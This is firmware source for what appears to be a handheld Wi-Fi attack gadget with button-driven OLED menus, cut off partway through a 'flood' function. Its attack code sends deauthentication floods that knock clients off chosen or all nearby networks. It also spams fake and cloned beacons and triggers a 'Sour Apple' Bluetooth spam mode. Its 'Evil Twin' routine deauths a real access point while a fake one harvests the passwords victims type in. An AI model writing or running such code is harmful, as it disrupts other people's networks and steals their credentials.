#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#undef max
#undef min
#include "vector"
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
char *ssid = "WarWick";
char *pass = "0123456789";
std::map<int, std::vector<int>> deauth_channels;
std::map<int , std::vector<int>> becaon_channels;
std::vector<int> chs_idx;

int scrollindex = 0;
// SETTINGS
int frames_per_deauth = 5;
int send_delay = 3;
int frames_per_becaon = 3;
int max_clone = 3;
int max_spam_space = 3;


bool isDeauthing = false;
bool led = true;

uint32_t current_ch_idx = 0;
uint32_t sent_frames = 0;

int selected_menu = 0;
int current_channel = 1;
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];

  short rssi;
  uint channel;
} WiFiScanResult;
struct Button {
  uint8_t pin;
  unsigned long lastDebounceTime = 0;
  int state = HIGH;
  int lastState = HIGH;
  Button(uint8_t p)
    : pin(p), lastDebounceTime(0), state(HIGH), lastState(HIGH) {}
};
#define BTN_DOWN PA12
#define BTN_UP PA27
#define BTN_OK PA13
#define BTN_BACK PB3

Button btnDown(BTN_DOWN);
Button btnUp(BTN_UP);
Button btnOk(BTN_OK);
Button btnBack(BTN_BACK);

void setupButtons() {
  pinMode(btnDown.pin, INPUT_PULLUP);
  pinMode(btnUp.pin, INPUT_PULLUP);
  pinMode(btnOk.pin, INPUT_PULLUP);
  pinMode(btnBack.pin, INPUT_PULLUP);
}

std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);

uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;


rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) { 
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char*) record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}




Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);
std::vector<String> at_names;
std::vector<String> main_names;
std::vector<String> becaon_names = {"Spam","Clone"};
std::vector<int> SelectedItem;
int fy = 0;
bool init_draw_menu_flag = false;
void drawBorders() {
    display.drawLine(25, 0, 55, 0, WHITE);
    display.drawLine(73, 0, 103, 0, WHITE);
    display.drawLine(25, 63, 55, 63, WHITE);
    display.drawLine(73, 63, 103, 63, WHITE);
}


void drawScrollbar(int selected, int menuSize, int maxVis, int lineH, int scrollBarW) {
    if (menuSize > maxVis) {
        int scrollBarH = (maxVis * lineH) * maxVis / menuSize;
        int scrollBarY = (selected * (maxVis * lineH - scrollBarH)) / (menuSize - 1);
        display.drawRect(128 - scrollBarW - 1, 3, scrollBarW, maxVis * lineH, WHITE);
        display.fillRect(128 - scrollBarW, scrollBarY + 3, scrollBarW - 1, scrollBarH, WHITE);
    }
}


void drawNavHints(int menuSize) {
    if (menuSize > 1) {
        display.fillTriangle(10, 0, 6, 4, 14, 4, WHITE);    // up
        display.fillTriangle(10, 63, 6, 59, 14, 59, WHITE); // down
    }
}


void drawPositionText(int selected, int menuSize, int maxVis) {
    if (menuSize > maxVis) {
        char positionText[8];
        display.setTextSize(1);
        display.setTextColor(WHITE);
        display.setCursor(100, 54);
        display.print(positionText);
    }
}


void renderText(const std::vector<String>& menu_name, int start, int fy, int renderCount, int lineH, int textHeight, int menuSize, int maxVis) {
    for (int idx = start; idx < menu_name.size() && idx < start + renderCount; idx++) {
        if (fy >= -lineH && fy < 64) { // 화면 내에서만 렌더링
            int textWidth = menu_name[idx].length() * 6;
            int rectWidth = textWidth + 10;
            int maxWidth = (menuSize > maxVis) ? 110 : 118;
            if (rectWidth < 40) rectWidth = 40;
            if (rectWidth > maxWidth) rectWidth = maxWidth;
            int rectX = (maxWidth - rectWidth) / 2 + 5;
            
            display.setTextColor(SSD1306_WHITE);
            int textX = rectX + (rectWidth - textWidth) / 2; // 수평 중앙
            int textY = fy + (lineH - textHeight) / 2;       // 수직 중앙
            display.setCursor(textX, textY);
            display.println(menu_name[idx]);
        }
        fy += lineH;
    }
}


void renderRoundRect(int rectX, int rectY, int rectWidth, int lineH, int cornerRadius) {
    display.drawRoundRect(rectX, rectY, rectWidth, lineH, cornerRadius, WHITE);
    display.drawRoundRect(rectX + 1, rectY + 1, rectWidth - 2, lineH - 2, cornerRadius - 1, WHITE);
}

void draw_menu(std::vector<String>& menu_name, int selected) {
    static int prev_selected = -1;
    const int lineH = 15;
    const int maxVis = 4;
    const int cornerRadius = 5;
    const int scrollBarW = 3;
    const int frames = 12;
    const float step = 1.0 / frames;
    const int textHeight = 8;
    const int menuSize = menu_name.size();
  
    if (prev_selected == -1 || prev_selected == selected) {
        prev_selected = selected;
        
        display.clearDisplay();
        
        int start = 0;
        if (menuSize > maxVis && selected >= maxVis - 1) {
            start = selected - (maxVis - 1);
            if (start + maxVis > menuSize) {
                start = menuSize - maxVis;
            }
        }
        
        drawBorders();
        drawScrollbar(selected, menuSize, maxVis, lineH, scrollBarW);
        //drawPositionText(selected, menuSize, maxVis);
        renderText(menu_name, start, 3, maxVis, lineH, textHeight, menuSize, maxVis);
        
        int fy = 3;
        for (int idx = start; idx < menuSize && idx < start + maxVis; idx++) {
            if (idx == selected) {
                int textWidth = menu_name[selected].length() * 6;
                int rectWidth = textWidth + 10;
                int maxWidth = (menuSize > maxVis) ? 110 : 118;
                if (rectWidth < 40) rectWidth = 40;
                if (rectWidth > maxWidth) rectWidth = maxWidth;
                int rectX = (maxWidth - rectWidth) / 2 + 5;
                renderRoundRect(rectX, fy, rectWidth, lineH, cornerRadius);
            }
            fy += lineH;
        }
        
        drawNavHints(menuSize);
        display.display();
        return;
    }
    
    // 이전 및 현재 선택 항목의 시작점 계산
    int prev_start = 0;
    if (menuSize > maxVis && prev_selected >= maxVis - 1) {
        prev_start = prev_selected - (maxVis - 1);
        if (prev_start + maxVis > menuSize) {
            prev_start = menuSize - maxVis;
        }
    }
    
    int start = 0;
    if (menuSize > maxVis && selected >= maxVis - 1) {
        start = selected - (maxVis - 1);
        if (start + maxVis > menuSize) {
            start = menuSize - maxVis;
        }
    }
    
    int prevY = 3 + (prev_selected - prev_start) * lineH;
    int targetY = 3 + (selected - start) * lineH;
    int prevTextWidth = menu_name[prev_selected].length() * 6;
    int prevRectWidth = prevTextWidth + 10;
    int maxWidth = (menuSize > maxVis) ? 110 : 118;
    if (prevRectWidth < 40) prevRectWidth = 40;
    if (prevRectWidth > maxWidth) prevRectWidth = maxWidth;
    
    int targetTextWidth = menu_name[selected].length() * 6;
    int targetRectWidth = targetTextWidth + 10;
    if (targetRectWidth < 40) targetRectWidth = 40;
    if (targetRectWidth > maxWidth) targetRectWidth = maxWidth;
    for (int i = 1; i <= frames; i++) {
        float t = i * step;
        float easedT = 1.0 - (1.0 - t) * (1.0 - t);
        int currentY = prevY + (targetY - prevY) * easedT;
        int currentWidth = prevRectWidth + (targetRectWidth - prevRectWidth) * easedT;
        int currentX = (maxWidth - currentWidth) / 2 + 5;
        

        float currentStart = prev_start + (start - prev_start) * easedT;
        int renderStart = (int)currentStart;
        float startFraction = currentStart - renderStart;
        
        display.clearDisplay();
        
        int fy = 3 - (int)(startFraction * lineH);
        drawBorders();
        drawScrollbar(selected, menuSize, maxVis, lineH, scrollBarW);
        //drawPositionText(selected, menuSize, maxVis);
        renderText(menu_name, renderStart, fy, maxVis + 1, lineH, textHeight, menuSize, maxVis);
        renderRoundRect(currentX, currentY, currentWidth, lineH, cornerRadius);
        drawNavHints(menuSize);
        
        display.display();
        delay(4);
    }
    
    display.clearDisplay();
    
    drawBorders();
    drawScrollbar(selected, menuSize, maxVis, lineH, scrollBarW);
    //drawPositionText(selected, menuSize, maxVis);
    renderText(menu_name, start, 3, maxVis, lineH, textHeight, menuSize, maxVis);
    
    int fy = 3;
    for (int idx = start; idx < menuSize && idx < start + maxVis; idx++) {
        if (idx == selected) {
            int textWidth = menu_name[selected].length() * 6;
            int rectWidth = textWidth + 10;
            int maxWidth = (menuSize > maxVis) ? 110 : 118;
            if (rectWidth < 40) rectWidth = 40;
            if (rectWidth > maxWidth) rectWidth = maxWidth;
            int rectX = (maxWidth - rectWidth) / 2 + 5;
            renderRoundRect(rectX, fy, rectWidth, lineH, cornerRadius);
        }
        fy += lineH;
    }
    
    drawNavHints(menuSize);
    display.display();
    
    prev_selected = selected;
}
bool contains(std::vector<int>& vec, int value) {
  for (int v : vec) {
    if (v == value) {
      return true;
    }
  }
  return false;
}
void addValue(std::vector<int>& vec, int value) {
  if (!contains(vec, value)) {
    vec.push_back(value);
  } else {
    Serial.print(value);
    Serial.println("Exits");
    for (auto IT = vec.begin(); IT != vec.end();) {
      if (*IT == value) {
        IT = vec.erase(IT);
      } else {
        ++IT;
      }
    }
    Serial.println("De-selected");
  }
}
// 디바운스 처리
bool ButtonPress(Button& btn, unsigned long debounceDelay = 50) {
  int reading = digitalRead(btn.pin);
  if (reading != btn.lastState) {
    btn.lastDebounceTime = millis();
  }

  if ((millis() - btn.lastDebounceTime) > debounceDelay) {
    if (reading != btn.state) {
      btn.state = reading;
      if (btn.state == LOW) {
        btn.lastState = reading;
        return true;
      }
    }
  }

  btn.lastState = reading;
  return false;
}
String generateRandomString(int len){
  String randstr = "";
  const char setchar[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  for (int i = 0; i < len; i++){
    int index = random(0,strlen(setchar));
    randstr += setchar[index];

  }
  return randstr;
}
char randomString[19];
int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
bool becaon_break_flag = false;

void becaon(int state){
  display_init();
  display.clearDisplay();
  display.drawRoundRect(0, 0, 128, 16, 4, WHITE);
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(6, 3);
  display.println("STATE");
  display.drawFastHLine(0, 17, 128, WHITE);
  display.setTextColor(WHITE);
  display.setCursor(4, 22);
  display.println(becaon_names[state]);
  const int cx = 110, cy = 26, r = 5;
  display.fillCircle(cx, cy, r, WHITE);
  display.drawCircle(cx, cy, r, WHITE); 
  display.display();

  while(!becaon_break_flag){
    RuningProgressBar();
    display.display();
    if(ButtonPress(btnBack)) becaon_break_flag = true;
    switch (state) {
      case 0: {
        for(int i=0;i<6;i++){
          byte randomByte = random(0x00, 0xFF);
          snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
        }
        int randomIndex = random(0,19);
        int randomChannel = allChannels[randomIndex];
        wext_set_channel(WLAN0_NAME,randomChannel);      
        String spamssid = generateRandomString(10);
        for (int j = 0; j<max_spam_space; j++){
          spamssid += " ";
          const char * spamssid_cstr = spamssid.c_str();
          for(int x=0;x<frames_per_becaon;x++){
            wifi_tx_beacon_frame(randomString,(void *) "\xFF\xFF\xFF\xFF\xFF\xFF",spamssid_cstr);
          }
        }
        break;
      }
      case 1: {       
        for (int i = 0 ; i < SelectedItem.size(); i++){
          int idx = SelectedItem[i];
          String clonessid = scan_results[idx].ssid;
          memcpy(becaon_bssid,scan_results[idx].bssid,6); 
          wext_set_channel(WLAN0_NAME,scan_results[idx].channel);
          for(int j = 0; j<max_clone; j++){
            clonessid += " ";            
            const char * clonessid_cstr = clonessid.c_str();
            for(int x =0;x<frames_per_becaon;x++) wifi_tx_beacon_frame_Privacy_RSN_IE(becaon_bssid,(void *) "\xFF\xFF\xFF\xFF\xFF\xFF",clonessid_cstr);
          }
        }
        break;
      }
    }
  } 
}

bool deauth_break_flag = false;
void deauth(int SetMode) {
  deauth_channels.clear();
  chs_idx.clear();
  current_ch_idx = 0;
  
  switch (SetMode) {
    case 0: {
      for (int i = 0; i < SelectedItem.size(); i++) {
        int idx = SelectedItem[i];
        int ch = scan_results[idx].channel;
        deauth_channels[ch].push_back(idx);
        if (!contains(chs_idx, ch)) {
          chs_idx.push_back(ch);
        }
      }
      break;
    }
    case 1: { 
      for (int i = 0; i < scan_results.size(); i++) {
        int ch = scan_results[i].channel;
        deauth_channels[ch].push_back(i);
        if (!contains(chs_idx, ch)) {
          chs_idx.push_back(ch);
        }
      }
      break;
    }
  }
  
  isDeauthing = true;
  deauth_break_flag = false;
  while (isDeauthing && !deauth_channels.empty() && !deauth_break_flag) {
    RuningProgressBar();
    display.display();
    if (current_ch_idx < chs_idx.size()) {
      int ch = chs_idx[current_ch_idx];
      wext_set_channel(WLAN0_NAME, ch);
      
      if (deauth_channels.find(ch) != deauth_channels.end()) {
        std::vector<int>& networks = deauth_channels[ch];
        
        for (int i = 0; i < frames_per_deauth; i++) {
          if (ButtonPress(btnBack)) {
            deauth_break_flag = true;
            break;
          }
          
          for (int j = 0; j < networks.size(); j++) {
            int idx = networks[j];
            memcpy(deauth_bssid, scan_results[idx].bssid, 6);
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
            sent_frames++;
          }
          
          delay(send_delay);
        }
      }
      current_ch_idx++;
      if (current_ch_idx >= chs_idx.size()) {
        current_ch_idx = 0;
      }
    }
  }
  
  isDeauthing = false;
  wext_set_channel(WLAN0_NAME, current_channel);
}
void SendToEsp(String text){
  Wire.beginTransmission(0x08);
  Wire.write(text.c_str());
  Wire.endTransmission();
  Serial.println("Sent: ");
  Serial.print(text);
  delay(50);  
}
void SourApple(){
  SendToEsp("Sour Apple Mode");
  display_init();
  delay(200);
  SendToEsp("RUN");
  while(true){
    RuningProgressBar();
    display.display();
    if(ButtonPress(btnBack)) {
      SendToEsp("Q");
      break;
    }
  }
}
void drawProgressBar(int x, int y, int width, int height, int progress){
  display.drawRect(x, y, width, height, WHITE);
  int fill = (progress * (width - 2)) / 100;
  display.fillRect(x + 1, y + 1, fill, height - 2, WHITE);
}
void showPopup(String message, int duration = 1500) {
  int16_t x1, y1;
  uint16_t w, h;
  display.getTextBounds(message, 0, 0, &x1, &y1, &w, &h);

  int boxWidth = w + 10;
  int boxHeight = h + 10;
  int boxX = (SCREEN_WIDTH - boxWidth) / 2;
  int boxY = (SCREEN_HEIGHT - boxHeight) / 2;
  
  display.fillRect(boxX, boxY, boxWidth, boxHeight, SSD1306_BLACK);
  display.drawRect(boxX, boxY, boxWidth, boxHeight, SSD1306_WHITE);

  display.setTextColor(SSD1306_WHITE);
  display.setCursor(boxX + 5, boxY + 5);
  display.print(message);
  display.display();
  
  delay(duration);
}
void RuningProgressBar(){
  static unsigned long lastupdate = 0;
  static int progress = 0;
  if(millis()  - lastupdate > 300){
    progress += 5;
    if (progress > 100) {
      progress =0;
      display.fillRect(10, 40, 100, 10, BLACK);  
    }
    lastupdate = millis();
  }
  drawProgressBar(10, 40, 100, 10, progress);
}

int SSID_NUM = 0;

int scrollindex2 = 0;
String RequestToEsp() {
  Wire.requestFrom(0x08, 50);
  String response = "";
  unsigned long startTime = millis();
  while (Wire.available() == 0) {
    if (millis() - startTime > 100) {
      return "NO RESPONSE";
    }
  }
  while (Wire.available()) {
    char c = Wire.read();
    response += c;
  }
  
  return response;
}
void Evil_Twin() {
  display.setTextColor(SSD1306_WHITE,SSD1306_BLACK);
  String TwinSSID = scan_results[SSID_NUM].ssid;
  TwinSSID = TwinSSID + " ";
  SendToEsp("Evil Twin Mode");
  delay(100);
  SendToEsp(TwinSSID);
  delay(100);
  
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("Evil Twin Active");
  display.println("SSID: " + TwinSSID);
  display.println("Waiting for login...");
  display.println("");
  display.println("BACK: Exit");
  display.display();
  
  String lastCapturedPs = "NONE";
  unsigned long lastCheckTime = 0;
  memcpy(deauth_bssid,scan_results[SSID_NUM].bssid,6);
  wext_set_channel(WLAN0_NAME,scan_results[SSID_NUM].channel);
  while(true) {
    if(ButtonPress(btnBack)) {
      SendToEsp("Q");
      delay(50);
      break;
    }
    wifi_tx_deauth_frame(deauth_bssid, (void *) "\xFF\xFF\xFF\xFF\xFF\xFF",2);
    unsigned long currentTime = millis();
    if (currentTime - lastCheckTime >= 500) {
      lastCheckTime = currentTime;
      
      String capturedPs = RequestToEsp();
      
      if (capturedPs != lastCapturedPs) {
        lastCapturedPs = capturedPs;
        
        display.clearDisplay();
        display.setCursor(0, 0);
        display.println("Evil Twin Active");
        display.println("SSID: " + TwinSSID);
        display.println("---------------");
        
        if (capturedPs != "NONE" && capturedPs != "NO RESPONSE") {
          display.println("Captured Password:");
          display.println(capturedPs);
        } else {
          display.println("Waiting for login...");
        }
        
        display.println("");
        display.println("BACK: Exit");
        display.display();
      }
    }
    delay(10);
  }
}
void ET_Selected() {
    display.clearDisplay();
    showPopup("Selecte Target SSID");
    const int lineH = 15;         
    const int maxVis = 4;         
    const int cornerRadius = 5;   
    const int frames = 12;       
    const float step = 1.0 / frames; 
    const int textHeight = 8;     
    static int prev_scrollindex2 = -1; 

    while (true) {
        int pageStart = (scrollindex2 / maxVis) * maxVis;
        int prevPageStart = prev_scrollindex2 == -1 ? pageStart : (prev_scrollindex2 / maxVis) * maxVis;
        bool animate = false;

        if (ButtonPress(btnDown) && scrollindex2 > 0) {
            prev_scrollindex2 = scrollindex2;
            scrollindex2--;
            prevPageStart = (prev_scrollindex2 / maxVis) * maxVis;
            pageStart = (scrollindex2 / maxVis) * maxVis;
            animate = prev_scrollindex2 != -1;
        }
        if (ButtonPress(btnUp) && scrollindex2 < scan_results.size() - 1) {
            prev_scrollindex2 = scrollindex2;
            scrollindex2++;
            prevPageStart = (prev_scrollindex2 / maxVis) * maxVis;
            pageStart = (scrollindex2 / maxVis) * maxVis;
            animate = prev_scrollindex2 != -1;
        }
        if (ButtonPress(btnOk)) {
            SSID_NUM = scrollindex2;
            break;
        }
        if (ButtonPress(btnBack)) {
            break;
        }

        if (animate) {
            int prevY = 3 + (prev_scrollindex2 - prevPageStart) * lineH;
            int targetY = 3 + (scrollindex2 - pageStart) * lineH;
            const int rectWidth = SCREEN_WIDTH; // 화면 전체 너비
            const int rectX = 0; // 왼쪽 정렬

            for (int i = 1; i <= frames; i++) {
                float t = i * step;
                float easedT = 1.0 - (1.0 - t) * (1.0 - t); // Quadratic easing out
                int currentY = prevY + (targetY - prevY) * easedT;

                display.clearDisplay();
                for (int line = 0; line < maxVis; line++) {
                    int idx = pageStart + line;
                    if (idx >= scan_results.size()) break;
                    String ssid = scan_results[idx].ssid;
                    if (ssid.length() == 0) ssid = "#HIDDEN";
                    else if (ssid.length() > 13) ssid = ssid.substring(0, 13) + "...";
                    int fy = 3 + line * lineH;
                    display.setTextColor(SSD1306_WHITE);
                    int textY = fy + (lineH - textHeight) / 2;
                    display.setCursor(5, textY); // 왼쪽 여백 5px
                    display.print(ssid);
                }
                renderRoundRect(rectX, currentY, rectWidth, lineH, cornerRadius);
                display.display();
                delay(4);
            }
        }

        display.clearDisplay();
        const int rectWidth = SCREEN_WIDTH; // 화면 전체 너비
        const int rectX = 0; // 왼쪽 정렬
        for (int line = 0; line < maxVis; line++) {
            int idx = pageStart + line;
            if (idx >= scan_results.size()) break;
            String ssid = scan_results[idx].ssid;
            if (ssid.length() == 0) ssid = "#HIDDEN";
            else if (ssid.length() > 13) ssid = ssid.substring(0, 13) + "...";
            int fy = 3 + line * lineH;
            display.setTextColor(SSD1306_WHITE);
            int textY = fy + (lineH - textHeight) / 2;
            display.setCursor(5, textY); // 왼쪽 여백 5px
            display.print(ssid);
            if (idx == scrollindex2) {
                renderRoundRect(rectX, fy, rectWidth, lineH, cornerRadius);
            }
        }
        display.display();
        
        prev_scrollindex2 = scrollindex2;
    }
}
void Draw_Selected_Menu() {
    const int lineH = 15;         
    const int maxVis = 4;        
    const int cornerRadius = 5;   
    const int frames = 12;        
    const float step = 1.0 / frames; 
    const int textHeight = 8;     
    const int markWidth = 3 * 6;  
    static int prev_scrollindex = -1; 
    const int scrollBarW = 3;
    int menuSize = scan_results.size();
    while (true) {
        int pageStart = (scrollindex / maxVis) * maxVis;
        int prevPageStart = prev_scrollindex == -1 ? pageStart : (prev_scrollindex / maxVis) * maxVis;
        bool animate = false;

        if (ButtonPress(btnUp) && scrollindex < scan_results.size() - 1) {
            prev_scrollindex = scrollindex;
            scrollindex++;
            prevPageStart = (prev_scrollindex / maxVis) * maxVis;
            pageStart = (scrollindex / maxVis) * maxVis;
            animate = prev_scrollindex != -1;
        }
        if (ButtonPress(btnDown) && scrollindex > 0) {
            prev_scrollindex = scrollindex;
            scrollindex--;
            prevPageStart = (prev_scrollindex / maxVis) * maxVis;
            pageStart = (scrollindex / maxVis) * maxVis;
            animate = prev_scrollindex != -1;
        }
        if (ButtonPress(btnOk)) {
            addValue(SelectedItem, scrollindex);
        }
        if (ButtonPress(btnBack)) {
            selected_menu = 0;
            break;
        }

        if (animate) {
            int prevY = 3 + (prev_scrollindex - prevPageStart) * lineH;
            int targetY = 3 + (scrollindex - pageStart) * lineH;
            const int rectWidth = SCREEN_WIDTH-25; // 화면 전체 너비
            const int rectX = 0; // 왼쪽 정렬

            for (int i = 1; i <= frames; i++) {
                float t = i * step;
                float easedT = 1.0 - (1.0 - t) * (1.0 - t); // Quadratic easing out
                int currentY = prevY + (targetY - prevY) * easedT;

                display.clearDisplay();
                for (int line = 0; line < maxVis; line++) {
                    int idx = pageStart + line;
                    if (idx >= scan_results.size()) break;
                    String ssid = scan_results[idx].ssid;
                    if (ssid.length() == 0) ssid = "#HIDDEN";
                    else if (ssid.length() > 13) ssid = ssid.substring(0, 13) + "...";
                    bool checked = contains(SelectedItem, idx);
                    String mark = checked ? "[*]" : "[ ]";
                    int fy = 3 + line * lineH;
                    display.setTextColor(SSD1306_WHITE);
                    int textY = fy + (lineH - textHeight) / 2;
                    display.setCursor(5, textY); // 왼쪽 여백 5px
                    display.print(ssid);
                    display.setCursor(SCREEN_WIDTH - markWidth - 7, textY); // 오른쪽 여백 8px
                    display.print(mark);
                }
                drawScrollbar(scrollindex,menuSize,maxVis,lineH,scrollBarW);
                renderRoundRect(rectX, currentY, rectWidth, lineH, cornerRadius);
                display.display();
            }
        }

        display.clearDisplay();
        const int rectWidth = SCREEN_WIDTH -25; // 화면 전체 너비 -25 
        const int rectX = 0; // 왼쪽 정렬
        for (int line = 0; line < maxVis; line++) {
            int idx = pageStart + line;
            if (idx >= scan_results.size()) break;
            String ssid = scan_results[idx].ssid;
            if (ssid.length() == 0) ssid = "#HIDDEN";
            else if (ssid.length() > 13) ssid = ssid.substring(0, 13) + "...";
            bool checked = contains(SelectedItem, idx);
            String mark = checked ? "[*]" : "[ ]";
            int fy = 3 + line * lineH;
            display.setTextColor(SSD1306_WHITE);
            int textY = fy + (lineH - textHeight) / 2;
            display.setCursor(5, textY); // 왼쪽 여백 5px
            display.print(ssid);
            display.setCursor(SCREEN_WIDTH - markWidth - 7, textY); // 오른쪽 여백 8px
            display.print(mark);
            if (idx == scrollindex) {
                
                renderRoundRect(rectX, fy, rectWidth, lineH, cornerRadius);
            }
        }
        drawScrollbar(scrollindex,menuSize,maxVis,lineH,scrollBarW);
        display.display();
        
        prev_scrollindex = scrollindex;
    }
}

void display_init(){
  //display.clearDisplay();
  display.setCursor(0,0);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
}
int selected_settings = 0;

std::vector<String> Settings = {"Per Deauth","Per Becaon","Max Clone","Max Spam"};
bool toggle_ok = false;
void renderText(const std::vector<String>& settings, int start, int fy, int renderCount, int lineH, int textHeight, int selected) {
    for (int idx = start; idx < settings.size() && idx < start + renderCount; idx++) {
        if (fy >= -lineH && fy < 64) { // 화면 내에서만 렌더링
            display.setTextColor(SSD1306_WHITE);
            int textX = 10; // 고정된 x 위치
            int textY = fy + (lineH - textHeight) / 2; // 수직 중앙
            display.setCursor(textX, textY);
            display.print(settings[idx]);
            display.setCursor(100, textY); // 오른쪽에 숫자 출력
            if (toggle_ok){
              display.setTextColor(SSD1306_BLACK,SSD1306_WHITE);
            }
            else{
              display.setTextColor(SSD1306_WHITE,SSD1306_BLACK);
            }
            switch (idx) {
                case 0:
                    display.println(frames_per_deauth);
                    break;
                case 1:
                    display.println(frames_per_becaon);
                    break;
                case 2:
                    display.println(max_clone);
                    break;
                case 3:
                    display.println(max_spam_space);
                    break;
            }
        }
        fy += lineH;
    }
}

void Draw_Settings() {
    display_init();
    int prev_selected_settings = selected_settings;
    const int lineH = 15;
    const int textHeight = 8;
    const int frames = 12;
    const int cornerRadius = 5;
    const int rectX = 5; 
    const int rectWidth = 118; 
    while (true) {
        if (ButtonPress(btnBack)) {
            selected_menu = 0; 
            toggle_ok = false;
            break;
        }
        if (ButtonPress(btnOk)) {
            toggle_ok = !toggle_ok;
        }
        if (ButtonPress(btnDown)) {
            if (toggle_ok) {
                switch (selected_settings) {
                    case 0:
                        frames_per_deauth++;
                        break;
                    case 1:
                        frames_per_becaon++;
                        break;
                    case 2:
                        max_clone++;
                        break;
                    case 3:
                        max_spam_space++;
                        break;
                }
            } else {
                if (0 < selected_settings) {
                    prev_selected_settings = selected_settings;
                    selected_settings--;
                    // 애니메이션
                    int prevY = 3 + prev_selected_settings * lineH;
                    int targetY = 3 + selected_settings * lineH;
                    for (int i = 1; i <= frames; i++) {
                        float t = i / (float)frames;
                        float easedT = 1.0 - (1.0 - t) * (1.0 - t); // Quadratic easing out
                        int currentY = prevY + (targetY - prevY) * easedT;
                        display.clearDisplay();
                        renderText(Settings, 0, 3, Settings.size(), lineH, textHeight, selected_settings);
                        renderRoundRect(rectX, currentY, rectWidth, lineH, cornerRadius);
                        display.display();
                        delay(4); // 프레임 간 지연
                    }
                }
            }
        }
        if (ButtonPress(btnUp)) {
            if (toggle_ok) {
                if ((frames_per_becaon > 0) && (frames_per_deauth > 0) && (max_clone > 0) && (max_spam_space > 0)) {
                    switch (selected_settings) {
                        case 0:
                            frames_per_deauth--;
                            break;
                        case 1:
                            frames_per_becaon--;
                            break;
                        case 2:
                            max_clone--;
                            break;
                        case 3:
                            max_spam_space--;
                            break;
                    }
                }
            } else {
                if (selected_settings < Settings.size() - 1) {
                    prev_selected_settings = selected_settings;
                    selected_settings++;
                    // 애니메이션
                    int prevY = 3 + prev_selected_settings * lineH;
                    int targetY = 3 + selected_settings * lineH;
                    for (int i = 1; i <= frames; i++) {
                        float t = i / (float)frames;
                        float easedT = 1.0 - (1.0 - t) * (1.0 - t); // Quadratic easing out
                        int currentY = prevY + (targetY - prevY) * easedT;
                        display.clearDisplay();
                        renderText(Settings, 0, 3, Settings.size(), lineH, textHeight, selected_settings);
                        renderRoundRect(rectX, currentY, rectWidth, lineH, cornerRadius);
                        display.display();
                        delay(4); // 프레임 간 지연
                    }
                }
            }
        }
        display.clearDisplay();
        renderText(Settings, 0, 3, Settings.size(), lineH, textHeight, selected_settings);
        int fy = 3 + selected_settings * lineH;
        renderRoundRect(rectX, fy, rectWidth, lineH, cornerRadius);
        display.display();
    }
}
void selection_handdler(std::vector<String>& menu_name_handle, int menu_func_state) {

  while (true) {
    //draw_menu(names,selected_menu);
    if (ButtonPress(btnBack)) {
      Serial.println("BACK");
      if (!menu_func_state == 0) selected_menu = 0;
      break;
    }
    if (ButtonPress(btnOk)) {
      switch (menu_func_state) {
        case 0:  //default
          switch (selected_menu) {
            case 0:
              //Attack Menu Draw Func
              draw_menu(at_names, 0);
              Serial.println("at_names Drawing");
              selection_handdler(at_names, 1);
              Serial.println(menu_func_state);
              draw_menu(menu_name_handle, selected_menu);  // MUST NEED IT
              break;
            case 1:
              if (scanNetworks("Scanning") != 0) {
                while(true) delay(1000);
              }
              selected_menu = 0;
              draw_menu(menu_name_handle, selected_menu);
              break;
            case 2:
              Draw_Selected_Menu();
              draw_menu(menu_name_handle, selected_menu);
              break;
            case 3:
              Draw_Settings();
              draw_menu(menu_name_handle, selected_menu);
              break;
          }
          break;
        case 1:
          AT_draw_func(selected_menu);
          draw_menu(menu_name_handle,selected_menu);
          break;
        case 2:
          switch(selected_menu){
            case 0:
              if(!becaon_break_flag) becaon(0);
              draw_menu(menu_name_handle, selected_menu);
              becaon_break_flag = false;
              break;
            case 1:
              if(!becaon_break_flag) becaon(1);
              draw_menu(menu_name_handle, selected_menu);
              becaon_break_flag = false;
              break;
          }
          break;
        default:
          Serial.println("ERROR");
          Serial.println(menu_func_state);
          break;
      }
    }
    if (ButtonPress(btnUp)) {
      if (selected_menu == menu_name_handle.size() - 1) {
        selected_menu = selected_menu;
      } else {
        selected_menu++;
        Serial.println(selected_menu);
        draw_menu(menu_name_handle, selected_menu);
        Serial.println("UP");
      }
    }
    if (ButtonPress(btnDown)) {
      if (selected_menu == 0) {
        selected_menu = 0;
      } else {
        selected_menu--;
        Serial.println(selected_menu);
        draw_menu(menu_name_handle, selected_menu);
        Serial.println("DOWN");
      }
    }
  }
}

void random_mac(uint8_t *mac) {
  for (int i = 0; i < 6; i++) mac[i] = random(0x00, 0xFF);
  mac[0] = (mac[0] & 0xFE) | 0x02;
}
bool assoc_flag = true;


void flood(const uint8_t* bssid, const char* ssid, uint32_t count, uint16_t delay_ms,int state){
  uint8_t random_src[6];
  for (uint32_t i = 0; i < count; i++) {
    if(ButtonPress(btnBack)) {
